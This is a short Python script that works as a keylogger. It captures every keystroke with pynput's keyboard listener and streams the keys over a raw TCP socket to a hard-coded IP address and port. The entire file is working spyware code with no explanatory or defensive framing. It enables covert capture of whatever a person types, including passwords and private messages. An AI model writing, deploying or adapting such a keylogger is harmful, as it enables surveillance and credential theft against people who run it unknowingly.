from pynput.keyboard import Listener
from pynput import mouse
from socket import *
from threading import Thread
from multiprocessing import Queue,Process


keys=Queue(10)
keys.put("test")

def press(key):
    #print(key)
    keys.put(str(key))

def GetKeyboard():
    with Listener(on_press = press) as listener:
            listener.join()

def sendkey():
    address=("192.168.8.108",47487)
    client=socket(AF_INET,SOCK_STREAM)
    client.connect(address)

    while True:
        if not keys.empty():
            Skey=keys.get()
            client.send(Skey.encode())
            #print(Skey)

if __name__=="__main__":
    t1=Thread(target=GetKeyboard,args=())
    t1.setDaemon(True)

    t2=Thread(target=sendkey,args=())
    t2.setDaemon(True)

    t1.start()
    t2.start()

    t1.join()
    t2.join()

